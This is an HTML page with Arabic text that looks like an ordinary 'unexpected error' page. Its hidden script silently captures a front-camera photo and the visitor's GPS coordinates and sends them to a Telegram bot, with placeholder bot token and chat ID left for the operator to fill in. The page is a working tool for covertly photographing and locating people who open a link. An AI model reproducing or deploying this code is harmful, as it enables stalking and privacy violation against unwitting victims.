<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>opps!</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f9f9f9;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      color: #444;
    }
    .container {
      max-width: 400px;
      padding: 30px;
      background-color: #fff;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
    }
    .icon {
      font-size: 50px;
      color: #e74c3c;
      margin-bottom: 15px;
    }
    h1 {
      font-size: 22px;
      margin-bottom: 10px;
    }
    p {
      font-size: 15px;
      color: #777;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="300" height="400" style="display:none;"></canvas>

  <div class="container">
    <h1>حدث خطأ غير متوقع</h1>
    <p>يرجى إعادة المحاولة لاحقًا.</p>
  </div>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    const botToken = "YOUR_BOT_TOKEN";  // ← غيّر هذا
    const chatId = "YOUR_CHAT_ID";      // ← غيّر هذا

    let latitude = null, longitude = null;

    // الحصول على الكاميرا
    navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    }).then(stream => {
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        setTimeout(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          stream.getTracks().forEach(track => track.stop());

          const imageData = canvas.toDataURL("image/png");
          if (latitude && longitude) {
            sendToTelegram(imageData, latitude, longitude);
          }
        }, 1000);
      };
    }).catch(err => {
      console.error("خطأ في الكاميرا:", err.message);
    });

    // الحصول على الموقع
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          latitude = pos.coords.latitude.toFixed(6);
          longitude = pos.coords.longitude.toFixed(6);
        },
        err => {
          console.error("خطأ في الموقع:", err.message);
        }
      );
    }

    // إرسال إلى تليجرام
    function sendToTelegram(base64Image, lat, lon) {
      fetch(base64Image)
        .then(res => res.blob())
        .then(blob => {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", blob, "image.png");
          formData.append("caption", `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}`);

          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
          });
        }).catch(error => {
          console.error("خطأ في الإرسال:", error.message);
        });
    }
  </script>
</body>
</html>
